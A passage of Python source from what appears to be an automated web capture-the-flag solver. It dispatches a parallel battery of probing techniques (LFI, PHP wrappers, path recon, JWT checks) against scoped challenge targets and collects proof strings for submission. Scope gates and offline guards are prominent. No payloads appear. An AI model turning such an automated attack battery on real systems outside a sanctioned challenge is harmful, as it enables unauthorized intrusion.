         Vary headers and 4xx/409 vocabulary collected; a payoff already present is returned;
      3. web_recipes.recognise + run: the recognised family's recipe runs ALONE; POST is allowed on the scope only while a STATEFUL recipe runs;
      4. only if no recipe proved: the read-only battery runs in parallel with POST REFUSED on the scope (web_scope.scoped_post honours
         scope.allow_post) and the stateful techniques (_STATEFUL_TECHS) left out - the blind battery can never spend a single credit;
      5. a proof equal to a static-page decoy seen by the disclosure is refused once a family was recognised.
    Optional /healthz-first dispatch (HUNTRESS_WEB_HEALTHZ_DISPATCH=1, D31) still runs first and unchanged."""
    from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FutTO
    import threading as _th
    import time as _time
    import os as _os_h
    import web_scope as _WSC
    try:        # SCOPE (2026-10-21): the authorized origin is the GM-declared target (exact scheme, host, port). A malformed or credential-bearing target runs nothing.
        scope = _WSC.Scope([target_url], seconds=max(1.0, float(deadline_s)) + 5.0)
    except _WSC.ScopeError:
        return None, None
    _WSC.register(scope)        # the technique threads below share it; _http_get refuses every other destination
    cancel = _th.Event()
    recipe_first = _os_h.environ.get("HUNTRESS_WEB_RECIPE_FIRST", "1").strip() != "0"
    _prev_scope = _WSC.get_current_scope()
    # Healthz-first shortcut (OPT-IN). Any failure falls through to the full battery.
    if _os_h.environ.get("HUNTRESS_WEB_HEALTHZ_DISPATCH", "0").strip() == "1":
        try:
            _WSC.set_current_scope(scope)
            prof = _fetch_healthz_profile(target_url)
            tech_name = _HEALTHZ_PROFILE_TO_TECH.get(prof) if prof else None
            if tech_name:
                for name, fn in _TECHNIQUES:
                    if name == tech_name:
                        try:
                            p = fn(target_url, prompt, cancel)
                        except Exception:
                            p = None
                        if p:
                            _WSC.unregister(scope)
                            _restore_scope(_WSC, _prev_scope)
                            return p, name + "@healthz"
                        break
        except Exception:
            pass  # fall through to full battery
        finally:
            _restore_scope(_WSC, _prev_scope)
    end_mono = _time.monotonic() + max(1.0, float(deadline_s))
    facts, notes, recognised = {}, {}, False
    if recipe_first:
        try:
            _WSC.set_current_scope(scope)
            scope.allow_post = False
            p, label, notes, facts = _recipe_first(target_url, prompt, scope, cancel, end_mono)
            recognised = bool(notes.get("recognised"))
            if p:
                _note_target(target_url, dict(notes, result=label))
                cancel.set()
                _WSC.unregister(scope)
                return p, label
        except Exception as e:
            notes = dict(notes or {}, recipe_error=type(e).__name__)
        finally:
            _restore_scope(_WSC, _prev_scope)
        scope.allow_post = False          # the battery below is blind: no POST reaches the target
    techniques = [(n, f) for n, f in _TECHNIQUES if not (recipe_first and n in _STATEFUL_TECHS)]
    decoys = set((facts or {}).get("decoy_proofs") or [])
    # No `with` block: its exit is shutdown(wait=True) and would hold the caller (and a found proof, or the deadline) behind a sibling's in-flight request.
    # Leftover threads see `cancel` between requests and every later request is refused once the scope is unregistered below.
    # D8-P1 2026-10-24: FAIL-CLOSED. If web_scope lacks set_current_scope (v3 not deployed), the
    # initializer raises AttributeError at worker start and the executor refuses - a silent fallback
    # would leave workers unscoped and reusable for cross-target borrow.
    ex = ThreadPoolExecutor(max_workers=max(1, len(techniques)),
                            initializer=_WSC.set_current_scope, initargs=(scope,))
    try:
        futs = {ex.submit(fn, target_url, prompt, cancel): name for name, fn in techniques}
        remaining = max(0.5, end_mono - _time.monotonic())
        try:
            for f in as_completed(list(futs), timeout=remaining):
                try:
                    p = f.result()
                except Exception:
                    p = None
                if p and recognised and p in decoys:
                    notes.setdefault("refused", []).append({"technique": futs[f], "why": "static-page decoy"})
                    continue
                if p:
                    _note_target(target_url, dict(notes, result=futs[f]))
                    return p, futs[f]
        except FutTO:
            pass
    finally:
        cancel.set()
        ex.shutdown(wait=False, cancel_futures=True)
        _WSC.unregister(scope)
    _note_target(target_url, dict(notes, result=None))
    return None, None


def _restore_scope(_WSC, prev):
    """put the caller thread's own scope binding back (None -> cleared)"""
    if prev is None:
        _WSC.clear_current_scope()
    else:
        _WSC.set_current_scope(prev)


def _answer_regex(question):
    """D32 web2: the regex a proof must fully match for THIS question: an explicit answer_format regex/pattern, a ^...$ pattern quoted in
    answer_format.syntax, else the universal web proof shape (kb/web_exploit_families.json answer_shape)."""
    import re as _r
    af = (question or {}).get("answer_format") if isinstance(question, dict) else None
    af = af if isinstance(af, dict) else {}
    cands = [af.get("regex"), af.get("pattern")]
    m = _r.search(r"(\^\S+\$)", str(af.get("syntax") or ""))
    if m:
        cands.append(m.group(1))
    for c in cands:
        if isinstance(c, str) and c:
            try:
                return _r.compile(c)
            except _r.error:
                continue
    return PROOF_RE_HS


def _answer_ok(value, question):
    """True when value (trimmed, per the web contract's normalization) fully matches the question's answer regex AND the universal proof shape"""
    v = str(value or "").strip()
    return bool(v) and bool(_answer_regex(question).fullmatch(v)) and bool(PROOF_RE_HS.fullmatch(v))


def _targets_file_path(day, entry):
    """<board>/<entry with / -> _>.targets.json - the ONE place both the writer and the repair capsule compute it."""
    import os as _o, board as _b          # autosolve_web has no module-level `os` import
    return _o.path.join(_b._board_dir(day), str(entry).replace("/", "_") + ".targets.json")


def _write_targets_file(start, targets_by_id):
    """D31 HS (c), agreed with WS {#workstation-30-D31-20}: publish THIS attempt's live target urls for a web agent the moment they
    are known and BEFORE the battery runs, so an agent never has to call the GM to see them. Atomic (tmp + os.replace). Contents:
    entry, mode, attempt_id, written, deadline, targets [{id, url}], routes, answer_ids - NO answer values, NO token, NO headers.
    Rewritten per mode (each mode is a new attempt with new urls). Day/challenge come from the same sources the preparing-poll
    uses (env HUNTRESS_CHALLENGE_ID / start fields / autosolve.py argv); if they cannot be determined nothing is written.
    Env HUNTRESS_WEB_TARGETS_FILE=0 disables. Never raises. -> path or None."""
    try:
        import os as _o, sys as _s, json as _j, time as _t
        if _o.environ.get("HUNTRESS_WEB_TARGETS_FILE", "1").strip() == "0" or not targets_by_id:
            return None
        st = start or {}
        cid = (_o.environ.get("HUNTRESS_CHALLENGE_ID") or st.get("challenge") or st.get("challenge_id") or "")
        day = _o.environ.get("HUNTRESS_DAY") or ""
        if len(_s.argv) > 2 and _o.path.basename(str(_s.argv[0])).startswith("autosolve"):
            day = day or _s.argv[1]
            cid = cid or _s.argv[2]
        cid = str(cid).split("/")[0]
        if not cid or not str(day).isdigit():
            return None
        mode = str(st.get("mode") or "single_solve").lower()
        entry = cid + ("/time_trial" if mode == "time_trial" else "/mastery" if mode == "mastery" else "")
        doc = {"schema": "huntress-web-targets/1", "entry": entry, "mode": mode, "attempt_id": st.get("attempt_id"),
               "written": _t.time(), "deadline": st.get("deadline"),
               "targets": [{"id": k, "url": v} for k, v in targets_by_id.items()],
               "routes": [{"id": r.get("id"), "path": r.get("path")} for r in (st.get("routes") or []) if isinstance(r, dict)],
               "answer_ids": list(st.get("answer_ids") or [])}
        p = _targets_file_path(int(day), entry)
        tmp = p + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            _j.dump(doc, fh, indent=1)
        _o.replace(tmp, p)
        return p
    except Exception:
        return None


def _attempt_seconds_left(start):
    """Seconds until THIS attempt's GM deadline (epoch number or ISO-8601 string), or None when the attempt has no deadline.
    D31 HS, from the VM runner (web_autosolve._target_seconds_limit): budgets follow the server's own clock. Never raises."""
    try:
        import datetime as _dt, time as _tm
        d = (start or {}).get("deadline")
        if isinstance(d, (int, float)) and not isinstance(d, bool):
            return float(d) - _tm.time()
        if isinstance(d, str) and d.strip():
            t = _dt.datetime.fromisoformat(d.strip().replace("Z", "+00:00"))
            if t.tzinfo is None:
                t = t.replace(tzinfo=_dt.timezone.utc)
            return (t - _dt.datetime.now(_dt.timezone.utc)).total_seconds()
    except Exception:
        return None
    return None


def _target_budget_s(start, default=90.0):
    """Per-target battery budget: the default, but never past the attempt deadline (minus a 2 s submit margin), never < 1 s."""
    left = _attempt_seconds_left(start)
    if left is None:
        return float(default)
    return max(1.0, min(float(default), left - 2.0))


def _proof_cache_path(start):
    """D31 HS: per-attempt web proof cache, see web_proof_cache.py (reuse only same attempt_id + answer id + url; a value
    the GM refused is retired by ctf_gm.GM.submit). Thin wrappers so a missing module can never break the handler."""
    try:
        import web_proof_cache as _wpc
        return _wpc.path(start)
    except Exception:
        return None


def _proof_cache_load(start):
    try:
        import web_proof_cache as _wpc
        return _wpc.load(start)
    except Exception:
        return {}


def _proof_cache_save(start, aid, url, proof):
    try:
        import web_proof_cache as _wpc
        _wpc.save(start, aid, url, proof)
    except Exception:
        pass


def _lfi_handler(start):
    """BATTERY DISPATCHER: resolve each proof-N answer_id to its Target N live URL, run the full technique battery
    on that URL, collect the proof string. Each target runs in its own thread so a two-target Mastery is solved in
    parallel. Returns {aid: proof_HEX} for every id solved. The empty dict signals compute() has nothing to say."""
    import os as _os
    # LIVE BATTERY SWITCH (2026-10-21): every request now goes through web_scope (exact scheme/host/port of the GM-declared target, no auto-followed redirects, hop-by-hop checks,
    # no credentials, request/time budget; _test_web_scope_gate.py 58/58). It stays OFF by default until the reviewed change passes the Production Deploy gate; HUNTRESS_WEB_LIVE_BATTERY=1
    # (or flipping this default after that approval) enables it.
    if _os.environ.get("HUNTRESS_WEB_LIVE_BATTERY") != "1":
        return {}
    import re as _re
    from concurrent.futures import ThreadPoolExecutor, as_completed
    prompt = str((start or {}).get("prompt") or "")
    questions = (start or {}).get("questions") or []
    targets_by_id = {t.get("id"): t.get("url") for t in ((start or {}).get("targets") or []) if t.get("url")}
    # D31 HS 2026-10-30 (agent-6 D30 Pass the Identity P0-3): GM.start for mastery/time_trial
    # sometimes returns before the live targets are provisioned (attempt is 'preparing'). Previously
    # we fell straight to the "_no_live_targets" marker and the autosolve dispatcher timed out at
    # ~90 s per target. Now, when targets[] is empty but attempt_id is present, poll GM.status
    # up to 3x with 10 s backoff to recover targets/routes/questions. Fail-silent: any error leaves
    # targets_by_id empty and the existing marker fires. Env HUNTRESS_WEB_PREPARING_POLL=0 disables.
    import os as _os_poll
    if (not targets_by_id and (start or {}).get("attempt_id")
            and _os_poll.environ.get("HUNTRESS_WEB_PREPARING_POLL", "1").strip() != "0"):
        try:
            import ctf_gm as _CGM, sys as _sys_poll, time as _time_poll
            _g = _CGM.GM()
            _mode = str((start or {}).get("mode") or "").lower()
            _cid = ((start or {}).get("challenge") or (start or {}).get("challenge_id")
                    or _os_poll.environ.get("HUNTRESS_CHALLENGE_ID") or "")
            if not _cid and len(_sys_poll.argv) > 2:
                _cid = _sys_poll.argv[2]
            if _cid:
                _entry = _cid + ("/time_trial" if _mode == "time_trial"
                                 else "/mastery" if _mode == "mastery" else "")
                # D31 HS, from the VM runner: poll every 2 s (= the GM.status cache TTL) instead of 3 x 10 s, for up to
                # HUNTRESS_WEB_PREPARING_WAIT_S (default 60) but never past the attempt deadline; stop the moment targets
                # arrive, the mode turns CORRECT, or status reports a DIFFERENT attempt (never mix two attempts' targets).
                _wait = float(_os_poll.environ.get("HUNTRESS_WEB_PREPARING_WAIT_S", "60") or 60)
                _step = max(0.5, float(_os_poll.environ.get("HUNTRESS_WEB_PREPARING_POLL_S", "2") or 2))
                _left = _attempt_seconds_left(start)
                if _left is not None:
                    _wait = max(0.0, min(_wait, _left - 5.0))
                _t_end = _time_poll.monotonic() + _wait
                _att0 = (start or {}).get("attempt_id")
                while True:
                    try:
                        _st = _g.status(_entry) or {}
                    except Exception:
                        _st = {}
                    if _st.get("attempt_id") and _att0 and _st.get("attempt_id") != _att0:
                        break                     # a different attempt: refuse to mix its targets into this one
                    if str(_st.get("result") or "").upper() == "CORRECT":
                        break
                    _tgt = _st.get("targets") or []
                    if _tgt:
                        targets_by_id = {t.get("id"): t.get("url") for t in _tgt
                                         if isinstance(t, dict) and t.get("url")}
                        if targets_by_id and isinstance(start, dict):
                            start["targets"] = _tgt
                            if _st.get("routes"):
                                start["routes"] = _st.get("routes")
                            if _st.get("questions") and not questions:
                                start["questions"] = _st.get("questions")
                                questions = _st.get("questions")
                        break
                    if _time_poll.monotonic() + _step > _t_end:
                        break
                    _time_poll.sleep(_step)
        except Exception:
            pass
    _write_targets_file(start, targets_by_id)        # D31 HS (c): publish this attempt's urls BEFORE the battery runs
    # Day 25 Mastery: routes[] gives a per-target path prefix (e.g. "/<hex>/") that the live app actually serves at.
    # Match by numeric suffix: Target 2 <-> target-2. Fold the path into target_url so techniques see the full URL.
    routes_by_num = {}
    for r in ((start or {}).get("routes") or []):
        rid = str(r.get("id") or "")
        m = _re.search(r"(\d+)$", rid)
        if m and r.get("path"):
            routes_by_num[m.group(1)] = r.get("path")
    # Build (aid, url) list for every proof-shaped question whose Target has a URL
    jobs = []
    for q in questions:
        aid = q.get("id") or ""
        if not _re.fullmatch(r"proof-\d+", aid) and not aid.endswith("_proof"):
            continue
        tid = q.get("artifact")
        url = targets_by_id.get(tid)
        if not url and q.get("set") not in (None, ""):
            # D31 HS, from the VM runner: match by the question's `set` number to the target id's number, but only if
            # exactly one target carries that number (never guess between two).
            _sn = str(q.get("set")).strip()
            _hits = [u for k, u in targets_by_id.items() if _re.search(r"(\d+)$", str(k or "")) and _re.search(r"(\d+)$", str(k)).group(1) == _sn]
            if len(_hits) == 1:
                url = _hits[0]
        # Fallback: if only one target exists overall, use it for every proof-N
        if not url and len(targets_by_id) == 1:
            url = list(targets_by_id.values())[0]
        if url:
            m = _re.search(r"(\d+)$", str(tid or aid))
            path = routes_by_num.get(m.group(1)) if m else None
            if path:
                base = url.rstrip("/")
                p = path if path.startswith("/") else ("/" + path)
                url = base + p.rstrip("/")
            jobs.append((aid, url))
    if not jobs:
        # D28 audit (agent-7 'If a Breach Falls in a Log'): a web HELD with 0 jobs must not be
        # SILENT. Previously this returned {} identically to "the battery ran and found no
        # proof", so a start that arrived with an empty/absent targets[] (the attempt is still
        # 'preparing' per the GM guidance, or targets[] was never captured into the start dict)
        # produced an opaque gate_blocked with no actionable signal for the next reader. Stash a
        # typed marker naming the real cause so .residue.json / the per-target diary carries it
        # verbatim. STILL returns {} (gate semantics unchanged); the only change is legibility.
        n_proof_q = sum(1 for q in questions
                        if _re.fullmatch(r"proof-\d+", str(q.get("id") or ""))
                        or str(q.get("id") or "").endswith("_proof"))
        if n_proof_q == 0:
            reason = "no proof-shaped answer_ids in start.questions (nothing for the web battery to solve)"
        elif not targets_by_id:
            reason = ("start carried no live targets[] (attempt may still be 'preparing', or "
                      "targets[] was not captured into the start dict) - battery did not run")
        else:
            reason = ("targets[] present but no proof-question resolved to a target URL "
                      "(artifact<->target id mismatch)")
        marker = {"_no_live_targets": {
            "reason": reason,
            "n_targets": len(targets_by_id),
            "n_proof_questions": n_proof_q,
            "has_routes": bool(routes_by_num),
        }}
        try:
            if isinstance(start, dict):
                start.setdefault("_web_dispatch_diary", {}).update(marker)
        except Exception:
            pass
        try:
            _stash_web_dispatch_diary(dict(marker))
        except Exception:
            pass
        return {}
    out = {}
    aid_to_q = {q.get("id"): q for q in questions if isinstance(q, dict)}   # D32 web2: each proof is checked against ITS question's answer_format
    # D27 audit (2026-10-27): per-target hit/miss diary so an all-or-HELD partial names which
    # answer_id failed instead of hiding it behind `gate_blocked`. Written to the task state
    # by _stash_wc_analysis below; readers of residue/.needuser can print this verbatim.
    diary = {}
    # D31 HS (from the VM runner): a rerun of autosolve on the SAME attempt (after a HELD) reuses every proof this attempt
    # already found for the SAME target url + answer id, and only runs the battery on the targets still missing one.
    # A different attempt_id or url is never reused. HUNTRESS_WEB_PROOF_CACHE=0 disables.
    _cached = _proof_cache_load(start)
    todo = []
    for aid, url in jobs:
        c = _cached.get(aid) if isinstance(_cached.get(aid), dict) else None
        if c and c.get("url") == url and c.get("proof"):
            out[aid] = c["proof"]
            diary[aid] = {"url": url, "proof": True, "technique": "proof_cache"}
        else:
            todo.append((aid, url))
    with ThreadPoolExecutor(max_workers=max(1, len(todo))) as ex:
        _budget = _target_budget_s(start)          # D31 HS, from the VM runner: never run past the attempt's own deadline
        futs = {ex.submit(_solve_target, url, prompt, _budget): aid for aid, url in todo}
        aid_to_url = {aid: url for aid, url in jobs}
        for f in as_completed(futs):
            aid = futs[f]
            try:
                proof, _tech = f.result()
            except Exception:
                proof, _tech = None, None
            _refused = None
            if proof and not _answer_ok(proof, aid_to_q.get(aid)):     # D32 web2: answer_format/regex gate (never a decoy, never a non-proof)
                _refused, proof = "answer_format", None
            diary[aid] = {"url": aid_to_url.get(aid), "proof": bool(proof), "technique": _tech}
            if _refused:
                diary[aid]["refused"] = _refused
            try:
                _tn = target_notes(aid_to_url.get(aid))
                if _tn:
                    diary[aid]["recognised"] = [r[:2] for r in (_tn.get("recognised") or [])][:3]
                    diary[aid]["recipes"] = [{k: r.get(k) for k in ("family", "hold", "detail")} for r in (_tn.get("recipes") or [])][:2]
            except Exception:
                pass
            if proof:
                proof = str(proof).strip()
                out[aid] = proof
                _proof_cache_save(start, aid, aid_to_url.get(aid), proof)
            # B4 submit-on-complete (2026-10-25, D26 fast-solver): once every expected
            # proof-id has resolved, cancel the still-running techniques and return.
            # On a 4-target Mastery where 3 return fast and 1 is slow, this saves the
            # full long-tail wait inside the 135 s window.
            if len(out) >= len(jobs):
                for _pending in futs:
                    if not _pending.done():
                        try:
                            _pending.cancel()
                        except Exception:
                            pass
                break
    # B3 all-or-HELD gate (2026-10-25, D26 fast-solver patches): never return a partial batch
    # on a ranked/timed mode. A partial submit on Mastery/TimeTrial burns the variant for 0 or
    # 1 point when a full HELD lets the agent extend the battery and retry on the next variant.
    # Signal: Mastery and TimeTrial carry a `deadline`; Single Solve does not. We also honor an
    # explicit `mode` field if ctf_gm starts to populate one.
    _mode = str((start or {}).get("mode") or "").lower()
    _has_deadline = bool((start or {}).get("deadline"))
    _is_timed = _mode in ("mastery", "time_trial") or _has_deadline
    # D27 audit: stash per-target diary onto the start dict so .residue.json carries it even
    # on the all-or-HELD path. The field is additive and never clears a key the dispatcher
    # already uses.
    try:
        if isinstance(start, dict):
            start.setdefault("_web_dispatch_diary", {})
            start["_web_dispatch_diary"].update(diary)
    except Exception:
        pass
    # D27 consolidation (2026-10-27): also stash a module-level singleton of the most recent diary
    # so autosolve._write_residue (which only sees `held`, not `start`) can retrieve it without a
    # Held contract change. autosolve calls compute() serially per attempt, so "most recent" is
    # unambiguous. Bounded size, additive, never raises.
    try:
        _stash_web_dispatch_diary(dict(diary))
    except Exception:
        pass
    if _is_timed and len(out) < len(jobs):
        # D31 HS 2026-10-30 (agent-6 Pass the Identity P2-11): the gate_blocked line downstream
        # hides which specific proof-N answer_ids failed. The diary already carries per-aid
        # {proof:bool} + technique + URL; echo the unresolved aids to stdout so .residue.json /
        # .needuser readers see the actionable signal without opening the dispatch diary.
        try:
            _missing = sorted(aid for aid in (diary or {})
                              if isinstance(diary.get(aid), dict) and not diary[aid].get("proof"))
            if _missing:
                print("AUTOSOLVE web: gate_blocked - unresolved proof ids: %s" %
                      ", ".join(_missing[:12]), flush=True)
        except Exception:
            pass
        # D31 HS 2026-10-31 (user: 'no guessing on truly novel; deterministic knowing'): when ZERO proofs
        # came back for a timed batch, every technique missed the whole target set. Rather than re-run
        # the ladder (D31 Framework Roulette: 177 s burned, nothing new learned), dump the exact recon
        # state so the agent reads the fingerprint + routes_hint + nearest_family_hits + next_action in
        # ONE file and acts deterministically. Fail-silent: a missing module or any raise is caught.
        if not out:
            try:
                import web_novel_family_hold as _nfh
                import os as _os_nfh, sys as _sys_nfh
                _day = _os_nfh.environ.get("HUNTRESS_DAY") or ""
                _cid = (_os_nfh.environ.get("HUNTRESS_CHALLENGE_ID")
                        or (start or {}).get("challenge") or (start or {}).get("challenge_id") or "")
                if not _cid and len(_sys_nfh.argv) > 2:
                    _cid = _sys_nfh.argv[2]
                if len(_sys_nfh.argv) > 1 and str(_sys_nfh.argv[1]).isdigit() and not _day:
                    _day = _sys_nfh.argv[1]
                if _cid and str(_day).isdigit():
                    _nfh_path = _nfh.dump(int(_day), str(_cid).split("/")[0], start,
                                          home_body=None, api_clues=None,
                                          ladder_trace=[(name, "run") for name in sorted({(d or {}).get("technique") for d in (diary or {}).values() if isinstance(d, dict) and d.get("technique")})],
                                          scope_state=None)
                    if _nfh_path:
                        print("AUTOSOLVE web: novel-family dump: %s" % _nfh_path, flush=True)
            except Exception:
                pass
        return {}
    return out


_LAST_WEB_DIARY = [None]            # single-slot: autosolve.compute() is serial per attempt
_WEB_DIARY_BYTES_MAX = 32 * 1024    # 32 KB (operator bound; additive, never changes gate semantics)
# D27 code-review remediation (2026-10-27, HIGH F7): the "serial per attempt" invariant is a
# property of the autosolve dispatcher, not of this module. A future refactor that runs two
# web compute()s concurrently inside one process would race the single slot: writer B could
# clobber writer A's record between A's final stash and _write_residue's read. The lock
# turns the read-modify-write into a critical section AND the reader into an atomic copy, so
# a reader never sees a half-written singleton. Taken only inside bounded, non-blocking ops;
# no I/O or sleep is held under the lock.
import threading as _th
_LAST_WEB_DIARY_LOCK = _th.Lock()


def _stash_web_dispatch_diary(diary):
    """Record the most-recent per-target diary. Bounded to 32 KB; a larger payload is trimmed to
    the first 8 technique records. Never raises; a stash failure is swallowed because autosolve
    must not crash on a telemetry step."""
    try:
        import json as _json
        payload = diary if isinstance(diary, dict) else {}
        try:
            enc = _json.dumps(payload, ensure_ascii=True)
        except Exception:
            payload = {}
            enc = "{}"
        if len(enc) > _WEB_DIARY_BYTES_MAX:
            trimmed = {}
            for k, v in list(payload.items())[:8]:
                if isinstance(v, dict):
                    trimmed[str(k)[:120]] = {
                        "url": str(v.get("url") or "")[:200],
                        "proof": bool(v.get("proof")),
                        "technique": (v.get("technique") or None),
                    }
            trimmed["_truncated"] = True
            payload = trimmed
        with _LAST_WEB_DIARY_LOCK:
            _LAST_WEB_DIARY[0] = payload
    except Exception:
        pass


def last_web_dispatch_diary():
    """Return the most recent per-target diary stashed by _lfi_handler, or {}.
    Called by autosolve._write_residue to attach the diary to .residue.json verbatim.
    Readers of residue see per-technique: url, proof (bool), technique name. Additive.
    D27 code-review remediation (HIGH F7): the read is atomic under _LAST_WEB_DIARY_LOCK so a
    concurrent writer cannot swap the slot between the dict() copy and its return."""
    with _LAST_WEB_DIARY_LOCK:
        return dict(_LAST_WEB_DIARY[0] or {})


_LAST_WC_ANALYSIS = {}      # bounded-LRU: id(start) -> {"status": "ok"|"error"|"disabled", "answers": {}, "held": {}, "report": {}, "error": None|{"type","message"}}
_LAST_WC_ORDER = []
_LAST_WC_MAX = 16


def _stash_wc_analysis(start, status, answers=None, held=None, report=None, error=None):
    """Record the dispatcher's full output (answers, held, report, error) for the SAME start dict, so recognise_extra can surface it without a second analyse() call.
    Keeps the newest _LAST_WC_MAX entries by insertion order and evicts the oldest. Never raises; a stash failure is swallowed because autosolve must not crash on a telemetry step."""
    try:
        key = id(start)
        _LAST_WC_ANALYSIS[key] = {"status": status, "answers": dict(answers or {}), "held": dict(held or {}),
                                  "report": dict(report or {}), "error": error}
        if key in _LAST_WC_ORDER:
            _LAST_WC_ORDER.remove(key)
        _LAST_WC_ORDER.append(key)
        while len(_LAST_WC_ORDER) > _LAST_WC_MAX:
            _LAST_WC_ANALYSIS.pop(_LAST_WC_ORDER.pop(0), None)
    except Exception:
        pass


def last_web_contract_analysis(start):
    """-> the most recent web_contracts.analyse() result for this exact start dict, or a neutral empty record. Used by recognise_extra and the prebrief
    digest to surface held reasons, parser errors and partial-answer status without re-running analyse()."""
    return _LAST_WC_ANALYSIS.get(id(start)) or {"status": "none", "answers": {}, "held": {}, "report": {}, "error": None}


def compute(start, blobs):
    """Web-lane deterministic layer for the autosolve dispatcher. The web GM field schema is NOT known from prior days,
    so this answers ONLY fields it can derive with certainty and never guesses the rest (those HELD for agent-6):
      - any *sha256*/*hash* field  -> sha256 of the matching delivered artifact (universal, always correct)
      - proof-N / *_proof fields with live targets[] -> run the WEB SOLVER BATTERY (2026-10-20): per-target parallel
        probe of body_scan, robots_recon, common_paths, lfi_viewer, lfi_php_wrappers; first proof_HEX wins. Mastery
        targets with different vuln classes are solved concurrently.
    Flags / JWT / secrets are surfaced to the agent via recognise_extra (digest), NOT auto-submitted, because a web
    answer_id's exact expected form is organizer-defined and a wrong submit helps nothing. Never executes a sample,
    never raises, never hits the network except the read-only headless probe inside _fast_wins and the solver battery.
    HELD/ERROR propagation (2026-10-21, fix for the audit-identified swallowing defect): the Web contract dispatcher's full
    output is stashed in _LAST_WC_ANALYSIS so recognise_extra can surface the typed HELD reasons, the answered-by-family report
    AND an explicit parser/dependency error record. compute() still never raises - a dispatcher exception is captured, not swallowed."""
    import hashlib, re as _re
    ids = (start or {}).get("answer_ids") or [q.get("id") for q in ((start or {}).get("questions") or [])]
    out = {}
    try:        # 2026-10-21: the question-contract dispatcher (hash | jwt | config | php_serialized | http) runs FIRST, selected by the question's own artifact reference; a typed HELD leaves the id for the fallbacks below and the agent
        import web_contracts as _WC
    except ImportError as _ie:
        _stash_wc_analysis(start, "disabled", error={"type": "ImportError", "message": "web_contracts: %s" % _ie})
    else:
        try:
            _ans, _held, _rep = _WC.analyse(start, blobs)
            _stash_wc_analysis(start, "ok", answers=_ans, held=_held, report=_rep)
            for _k, _v in (_ans or {}).items():
                if _k in ids and _v not in (None, ""):
                    out[_k] = _v
        except Exception as _e:
            # a real parser/dependency failure: record it typed so recognise_extra surfaces it to the agent as web_contract_error (NOT a silent unsupported).
            _stash_wc_analysis(start, "error", error={"type": type(_e).__name__, "message": str(_e)[:300]})
    # the LEGACY id-only hash mapping below stays only for an id that has NO question in the start (the old shape): when a question exists the dispatcher decides,
    # because an answer-id substring alone is not evidence of which artifact the question means (a wrong answer helps nothing)
    with_q = {q.get("id") for q in ((start or {}).get("questions") or []) if isinstance(q, dict)}
    for aid in ids:
        if aid in out or aid in with_q:
            continue
        low = aid.lower()
        if "sha256" in low or low.endswith("_hash") or "_md5" in low or "_sha1" in low:
            # D32: EXACT artifact mapping or HELD. Explicit index N -> artifact N only if it exists; no index -> only when exactly
            # one artifact was delivered; an empty/missing artifact -> HELD. (The old fallback answered artifact 0 or the hash of
            # b"" - a confident wrong answer.)
            m = _re.search(r"(?:sha256|hash|md5|sha1)_(\d+)", low)
            bl = list(blobs or [])
            if m:
                idx = int(m.group(1)) - 1
                b = bl[idx] if 0 <= idx < len(bl) else None
            else:
                b = bl[0] if len(bl) == 1 else None
            if not b:
                continue
            if "sha256" in low:
                out[aid] = hashlib.sha256(b).hexdigest()
            elif "_sha1" in low:
                out[aid] = hashlib.sha1(b).hexdigest()
            elif "_md5" in low:
                out[aid] = hashlib.md5(b).hexdigest()
    try:
        out.update(_lfi_handler(start))
    except Exception:
        pass
    # D32: the D30 "family hint" probe (2 live GETs per target, up to 4 s each) was removed - its result was stripped before
    # return and read by nothing (survey + grep), so it only cost request budget and time. Family recognition lives in
    # web_family_match / the battery, which already see the same responses.
    # D30 HS GAP B proof-shape guard (2026-10-29): drop any proof-N / *_proof answer whose value is NOT a verbatim proof_<32 hex> string. Prevents the gate_blocked class D29 Trust the Build MM hit (solver returned a hostname / case id, GM rejected the whole batch). Non-proof fields (sha256, hash, info keys) pass through. Agent AUTO-LOOP sees the dropped id and re-derives.
    for _k in list(out.keys()):
        if _k.startswith("_"):
            continue  # internal hint keys stripped below
        _low = str(_k).lower()
        if _low.startswith("proof-") or _low.endswith("_proof"):
            if not is_valid_web_proof(out[_k]):
                del out[_k]
    # Strip internal underscore-prefixed hint keys so they never reach GM.submit (the agent can still read them in residue/journal via last_web_contract_analysis + the compute() return).
    for _k in [k for k in out if k.startswith("_")]:
        del out[_k]
    return out


def replay(task, blobs, mode=None):
    """OFFLINE REPLAY ENTRY POINT: the static Web analysis over SAVED bytes/captures under offline_guard(), so any network
    attempt raises OfflineNetworkError instead of connecting (D32: moved here from the retired _commander_web copy)."""
    return recognise_extra(task, blobs, mode, live=False)


def recognise_extra(task, blobs, mode=None, live=False, allowed_hosts=None):
    """Optional prebrief hook (same contract as the homestation binary/script lanes): surface the deterministic web
    fast-wins into agent-6's digest as FACTS, and list the non-hash answer_ids we did NOT fill as missing_tokens so the
    agent knows exactly what it must solve. No GM call, no submit, no execution.
    live=False (default) is the OFFLINE path: it runs under offline_guard(), makes no request and records the declared target as NOT probed. live=True is an explicit opt-in: ONLY the
    task's declared http(s) target is probed, through probe() and the scope gate (web_scope.py); allowed_hosts is the explicit host allow-list (default: the declared target's own host).
    The outcome, including a refusal, is recorded in facts['web_live']."""
    try:
        if live:
            fw = _fast_wins(task, blobs, live=True)
        else:
            with offline_guard():
                fw = _fast_wins(task, blobs)
    except Exception:
        fw = {"flags": [], "secrets": [], "jwts": [], "notes": []}
    web_live = None
    if live:
        target = _declared_target(task)
        if not target:
            web_live = {"probed": False, "note": "no declared target: nothing probed"}
        else:
            from urllib.parse import urlsplit as _us
            host = _us(target).hostname or ""
            hosts = allowed_hosts if allowed_hosts is not None else [host]
            res = probe(target, allowed_hosts=hosts)
            if isinstance(res, dict) and "refused" in res:
                web_live = {"probed": False, "target": target, "host": host, "refused": res["refused"]}
            else:
                web_live = {"probed": True, "target": target, "host": host, "result": res}
                for v in res.values():
                    for f in (v.get("flags") or []):
                        if f not in fw["flags"]:
                            fw["flags"].append(f)
    ids = (task or {}).get("answer_ids") or [q.get("id") for q in ((task or {}).get("questions") or [])]
    answered = set(compute(task, blobs))
    facts = {}
    if web_live is not None:
        facts["web_live"] = web_live
    if fw["flags"]:
        facts["web_flags_in_bytes"] = fw["flags"][:5]
    if fw["jwts"]:
        facts["web_jwt"] = [{k: j.get(k) for k in ("header", "payload", "weak_secret", "forge_none")} for j in fw["jwts"][:3]]
    if fw["secrets"]:
        facts["web_secrets"] = fw["secrets"][:8]
    if fw["notes"]:
        facts["web_notes"] = fw["notes"][:6]
